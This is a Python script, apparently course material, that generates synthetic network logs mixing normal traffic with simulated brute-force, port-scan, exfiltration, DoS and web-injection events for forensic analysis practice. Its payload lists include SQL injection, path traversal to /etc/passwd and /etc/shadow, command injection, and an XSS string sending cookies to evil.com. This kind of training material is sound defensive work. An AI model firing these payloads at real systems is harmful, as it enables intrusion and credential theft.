"""
Network Log Analyzer - Synthetic Network Traffic & Attack Log Generator
Author: Senior Cybersecurity Engineer
Course: Network Security & Forensics (NSF)
"""

import os
import random
import argparse
from datetime import datetime, timedelta
import pandas as pd
from config import THREAT_INTEL_BLACKLIST

# Sample Internal Subnet & Servers
INTERNAL_IPS = [
    "192.168.1.10", "192.168.1.15", "192.168.1.20", "192.168.1.25",
    "192.168.1.50", "192.168.1.100", "10.0.0.5", "10.0.0.12"
]
TARGET_SERVERS = {
    "192.168.1.100": {"name": "Web_Portal", "ports": [80, 443, 8080]},
    "192.168.1.50": {"name": "Database_Master", "ports": [3306, 5432, 1433]},
    "192.168.1.20": {"name": "Domain_Controller_Auth", "ports": [53, 88, 389, 445]},
    "192.168.1.10": {"name": "Core_Router_Gateway", "ports": [22, 23, 161]},
    "10.0.0.5": {"name": "Internal_File_Server", "ports": [445, 21]}
}

# Normal external IPs
LEGIT_EXTERNAL_IPS = [
    "203.0.113.15", "198.51.100.8", "192.0.2.45", "172.217.16.206",
    "142.250.190.46", "151.101.65.140", "104.244.42.1", "13.107.42.14"
]

# Designated Attacker IPs for demonstration
ATTACKER_BRUTE_FORCE = "194.26.29.112"      # In threat intel list (RU botnet)
ATTACKER_PORT_SCANNER = "45.155.205.233"    # Recon scanner
ATTACKER_EXFIL_HOST = "192.168.1.25"        # Compromised internal host
ATTACKER_EXFIL_DEST = "103.203.57.18"       # C2 Server in threat intel
ATTACKER_WEB_EXPLOIT = "185.220.101.5"      # Tor Exit node
ATTACKER_DOS = "198.51.100.42"              # Flood source

# Common Scan Ports
SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 1433, 1521, 3306, 3389, 5432, 6379, 8080, 27017]

# Web Attack Payloads
SQLI_PAYLOADS = [
    "GET /login.php?user=admin' OR '1'='1 -- HTTP/1.1",
    "POST /api/search?q=UNION SELECT username,password FROM users-- HTTP/1.1",
    "GET /items.php?id=1; DROP TABLE logs;-- HTTP/1.1",
    "POST /auth?user=admin' AND 1=1; WAITFOR DELAY '0:0:5'-- HTTP/1.1"
]
XSS_PAYLOADS = [
    "GET /comment?msg=<script>alert('XSS_VULNERABLE')</script> HTTP/1.1",
    "POST /profile/update?bio=<img src=x onerror=javascript:document.location='http://evil.com/cookie?c='+document.cookie> HTTP/1.1",
    "GET /search?q=<script src='http://185.220.101.5/hook.js'></script> HTTP/1.1"
]
TRAVERSAL_PAYLOADS = [
    "GET /download.php?file=../../../../etc/passwd HTTP/1.1",
    "GET /view?page=..%2f..%2f..%2fwindows/system32/cmd.exe HTTP/1.1",
    "GET /reports?doc=../../../../etc/shadow HTTP/1.1"
]
CMD_INJECTION_PAYLOADS = [
    "POST /diagnostics?host=127.0.0.1; cat /etc/passwd HTTP/1.1",
    "GET /ping?target=192.168.1.1 | whoami HTTP/1.1"
]


class NetworkLogGenerator:
    """Generates synthetic network traffic logs with simulated cyber attack vectors."""

    def __init__(self, start_time=None):
        self.current_time = start_time if start_time else datetime.now() - timedelta(hours=2)

    def _format_log_line(self, dt, src_ip, src_port, dst_ip, dst_port, protocol, action, status_code, bytes_count, msg):
        """Standard Syslog/Firewall log line formatter."""
        ts_str = dt.strftime("%Y-%m-%d %H:%M:%S")
        return f'{ts_str} {src_ip}:{src_port} -> {dst_ip}:{dst_port} {protocol} {action} {status_code} {bytes_count} "{msg}"'

    def generate_normal_log(self):
        """Generates a normal legitimate network log entry."""
        self.current_time += timedelta(seconds=random.randint(1, 5))
        is_inbound = random.choice([True, False])
        
        if is_inbound:
            src_ip = random.choice(LEGIT_EXTERNAL_IPS)
            dst_ip = random.choice(list(TARGET_SERVERS.keys()))
            dst_port = random.choice(TARGET_SERVERS[dst_ip]["ports"])
        else:
            src_ip = random.choice(INTERNAL_IPS)
            dst_ip = random.choice(LEGIT_EXTERNAL_IPS)
            dst_port = random.choice([80, 443, 53, 8080])

        src_port = random.randint(1024, 65535)
        protocol = "UDP" if dst_port == 53 else "TCP"
        action = "ALLOW"
        status_code = random.choices([200, 204, 301, 302, 304, 404], weights=[70, 5, 10, 5, 8, 2])[0]
        bytes_count = random.randint(250, 45000)
        
        if dst_port == 53:
            msg = f"DNS Query A record for legit-domain.org resolved"
        elif dst_port in [80, 443, 8080]:
            msg = f"HTTP/1.1 GET /dashboard/index.html Status {status_code}"
        elif dst_port == 22:
            msg = "SSH session established successfully for user devops"
        elif dst_port in [3306, 5432]:
            msg = "Database query SELECT * FROM inventory executed"
        else:
            msg = "Standard TCP session established"

        return {
            "timestamp": self.current_time.strftime("%Y-%m-%d %H:%M:%S"),
            "source_ip": src_ip,
            "source_port": src_port,
            "destination_ip": dst_ip,
            "destination_port": dst_port,
            "protocol": protocol,
            "action": action,
            "status_code": status_code,
            "bytes_transferred": bytes_count,
            "message": msg,
            "raw_log": self._format_log_line(self.current_time, src_ip, src_port, dst_ip, dst_port, protocol, action, status_code, bytes_count, msg)
        }

    def generate_brute_force_attack(self, attempts=12):
        """Simulates SSH/Admin Web Brute Force Attack from single IP."""
        logs = []
        target_ip = "192.168.1.10"
        target_port = 22  # SSH Port
        passwords_tried = ["admin", "password123", "root", "toor", "123456", "letmein", "master", "cisco", "oracle", "qwerty"]

        for i in range(attempts):
            self.current_time += timedelta(seconds=random.randint(1, 3))
            src_port = random.randint(30000, 60000)
            pwd = passwords_tried[i % len(passwords_tried)]
            action = "BLOCK"
            status_code = 401
            bytes_count = random.randint(120, 350)
            msg = f"Failed password authentication attempt for user 'root' with pass '{pwd}'"

            logs.append({
                "timestamp": self.current_time.strftime("%Y-%m-%d %H:%M:%S"),
                "source_ip": ATTACKER_BRUTE_FORCE,
                "source_port": src_port,
                "destination_ip": target_ip,
                "destination_port": target_port,
                "protocol": "TCP",
                "action": action,
                "status_code": status_code,
                "bytes_transferred": bytes_count,
                "message": msg,
                "raw_log": self._format_log_line(self.current_time, ATTACKER_BRUTE_FORCE, src_port, target_ip, target_port, "TCP", action, status_code, bytes_count, msg)
            })
        return logs

    def generate_port_scan_attack(self, num_ports=14):
        """Simulates aggressive TCP SYN Port Reconnaissance."""
        logs = []
        target_ip = "192.168.1.50"
        selected_ports = random.sample(SCAN_PORTS, min(num_ports, len(SCAN_PORTS)))

        for port in selected_ports:
            self.current_time += timedelta(milliseconds=random.randint(200, 800))
            src_port = random.randint(40000, 65000)
            action = "DROP"
            status_code = 0
            bytes_count = 64
            msg = f"TCP SYN stealth port probe to port {port}"

            logs.append({
                "timestamp": self.current_time.strftime("%Y-%m-%d %H:%M:%S"),
                "source_ip": ATTACKER_PORT_SCANNER,
                "source_port": src_port,
                "destination_ip": target_ip,
                "destination_port": port,
                "protocol": "TCP",
                "action": action,
                "status_code": status_code,
                "bytes_transferred": bytes_count,
                "message": msg,
                "raw_log": self._format_log_line(self.current_time, ATTACKER_PORT_SCANNER, src_port, target_ip, port, "TCP", action, status_code, bytes_count, msg)
            })
        return logs

    def generate_data_exfiltration_attack(self):
        """Simulates massive abnormal outbound data exfiltration."""
        logs = []
        # 3 large transfers in sequence
        for chunk in range(3):
            self.current_time += timedelta(seconds=random.randint(10, 30))
            src_port = random.randint(50000, 60000)
            dst_port = 443
            action = "ALLOW"
            status_code = 200
            # 8 MB to 15 MB per chunk
            bytes_count = random.randint(8 * 1024 * 1024, 15 * 1024 * 1024)
            msg = f"Encrypted TLS large data transfer stream chunk {chunk+1}/3 to external endpoint"

            logs.append({
                "timestamp": self.current_time.strftime("%Y-%m-%d %H:%M:%S"),
                "source_ip": ATTACKER_EXFIL_HOST,
                "source_port": src_port,
                "destination_ip": ATTACKER_EXFIL_DEST,
                "destination_port": dst_port,
                "protocol": "TCP",
                "action": action,
                "status_code": status_code,
                "bytes_transferred": bytes_count,
                "message": msg,
                "raw_log": self._format_log_line(self.current_time, ATTACKER_EXFIL_HOST, src_port, ATTACKER_EXFIL_DEST, dst_port, "TCP", action, status_code, bytes_count, msg)
            })
        return logs

    def generate_web_attacks(self):
        """Simulates Web Injection Attacks (SQLi, XSS, Path Traversal)."""
        logs = []
        payloads = [
            (random.choice(SQLI_PAYLOADS), 500, "SQL Syntax Error or Injection attempt detected"),
            (random.choice(XSS_PAYLOADS), 403, "WAF Rule Triggered: Cross-Site Scripting Pattern"),
            (random.choice(TRAVERSAL_PAYLOADS), 403, "Access Denied: Path Traversal sequence blocked"),
            (random.choice(CMD_INJECTION_PAYLOADS), 403, "Command Injection signature blocked")
        ]

        for payload, status, msg_suffix in payloads:
            self.current_time += timedelta(seconds=random.randint(5, 15))
            src_port = random.randint(30000, 60000)
            dst_ip = "192.168.1.100"
            dst_port = 80
            action = "BLOCK" if status in [403, 401] else "ALLOW"
            bytes_count = random.randint(500, 3200)
            full_msg = f"{payload} - {msg_suffix}"

            logs.append({
                "timestamp": self.current_time.strftime("%Y-%m-%d %H:%M:%S"),
                "source_ip": ATTACKER_WEB_EXPLOIT,
                "source_port": src_port,
                "destination_ip": dst_ip,
                "destination_port": dst_port,
                "protocol": "TCP",
                "action": action,
                "status_code": status,
                "bytes_transferred": bytes_count,
                "message": full_msg,
                "raw_log": self._format_log_line(self.current_time, ATTACKER_WEB_EXPLOIT, src_port, dst_ip, dst_port, "TCP", action, status, bytes_count, full_msg)
            })
        return logs

    def generate_dos_flood(self, count=45):
        """Simulates rapid high-rate request burst / DoS attack."""
        logs = []
        target_ip = "192.168.1.100"
        target_port = 80

        for _ in range(count):
            self.current_time += timedelta(milliseconds=random.randint(50, 250))
            src_port = random.randint(1024, 65535)
            action = "DROP"
            status_code = 503
            bytes_count = 128
            msg = "HTTP Flood / High Request Rate SYN flood burst"

            logs.append({
                "timestamp": self.current_time.strftime("%Y-%m-%d %H:%M:%S"),
                "source_ip": ATTACKER_DOS,
                "source_port": src_port,
                "destination_ip": target_ip,
                "destination_port": target_port,
                "protocol": "TCP",
                "action": action,
                "status_code": status_code,
                "bytes_transferred": bytes_count,
                "message": msg,
                "raw_log": self._format_log_line(self.current_time, ATTACKER_DOS, src_port, target_ip, target_port, "TCP", action, status_code, bytes_count, msg)
            })
        return logs

    def generate_dataset(self, normal_count=150, include_attacks=True):
        """Creates a mixed dataset containing background traffic and realistic attack vectors."""
        all_logs = []
        
        # 1. Normal traffic baseline
        for _ in range(normal_count):
            all_logs.append(self.generate_normal_log())

        if include_attacks:
            # Inject attack vectors
            all_logs.extend(self.generate_brute_force_attack(attempts=15))
            
            for _ in range(20):
                all_logs.append(self.generate_normal_log())
                
            all_logs.extend(self.generate_port_scan_attack(num_ports=12))
            
            for _ in range(25):
                all_logs.append(self.generate_normal_log())
                
            all_logs.extend(self.generate_data_exfiltration_attack())
            
            for _ in range(15):
                all_logs.append(self.generate_normal_log())
                
            all_logs.extend(self.generate_web_attacks())
            
            for _ in range(20):
                all_logs.append(self.generate_normal_log())
                
            all_logs.extend(self.generate_dos_flood(count=45))

        # Sort all logs by timestamp to maintain forensic time consistency
        all_logs.sort(key=lambda x: x["timestamp"])
        return all_logs


def save_logs_to_file(logs, filepath, fmt="log"):
    """Saves generated log records to either standard .log or .csv format."""
    os.makedirs(os.path.dirname(filepath), exist_ok=True)
    if fmt == "csv":
        df = pd.DataFrame(logs)
        # Drop raw_log from CSV table columns for cleanliness if needed or keep it
        df.to_csv(filepath, index=False)
    else:
        with open(filepath, "w", encoding="utf-8") as f:
            for item in logs:
                f.write(item["raw_log"] + "\n")
    print(f"[+] Successfully saved {len(logs)} log entries to: {filepath}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate Synthetic Network Logs with Cyber Attacks")
    parser.add_argument("--count", type=int, default=200, help="Number of normal log records")
    parser.add_argument("--output", type=str, default="sample_logs/mixed_attacks.log", help="Output file path")
    parser.add_argument("--format", type=str, choices=["log", "csv"], default="log", help="File format")
    parser.add_argument("--no-attacks", action="store_true", help="Generate only normal traffic")

    args = parser.parse_args()
    generator = NetworkLogGenerator()
    dataset = generator.generate_dataset(normal_count=args.count, include_attacks=not args.no_attacks)
    save_logs_to_file(dataset, args.output, fmt=args.format)
